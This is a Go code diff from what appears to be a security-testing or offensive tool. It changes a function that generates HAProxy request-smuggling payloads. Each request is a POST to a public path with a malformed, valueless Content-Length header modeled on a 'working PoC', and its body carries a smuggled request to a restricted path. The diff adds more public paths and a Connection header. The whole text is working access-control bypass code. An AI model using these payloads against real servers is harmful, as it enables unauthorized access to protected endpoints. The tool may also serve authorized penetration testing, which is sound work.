@@ -41,8 +41,13 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 
 	// Test various public endpoints before the restricted one
 	publicPaths := []string{
+		"/",
 		"/public",
 		"/guest",
+		"/index",
+		"/robots.txt",
+		"/sitemap.xml",
+		"/favicon.ico",
 	}
 
 	// Generate overflow pattern - exact pattern from working PoC
@@ -74,19 +79,23 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			Method:       "POST",
 			Scheme:       parsedURL.Scheme,
 			Host:         host,
-			RawURI:       publicPath, // POST goes to PUBLIC path
+			RawURI:       publicPath,
 			BypassModule: bypassModule,
-			Body:         smuggledRequest, // BODY contains request to RESTRICTED path
+			Body:         smuggledRequest,
 			Headers: []Headers{
 				// 1. Malformed header FIRST - NO VALUE after colon (like working PoC)
 				{
-					Header: malformedHeaderName, // e.g., "Content-Length0aaa..." (no colon, request.go adds it)
+					Header: malformedHeaderName, // e.g., "Content-Length0aaa..."
 					Value:  "",                  // EMPTY VALUE - this is critical!
 				},
 				// 2. Real Content-Length will be deferred to LAST position in request.go
 				{
 					Header: "Content-Length",
 					Value:  fmt.Sprintf("%d", calculatedContentLength),
+				},
+				{
+					Header: "Connection",
+					Value:  "close",
 				},
 			},
 		}
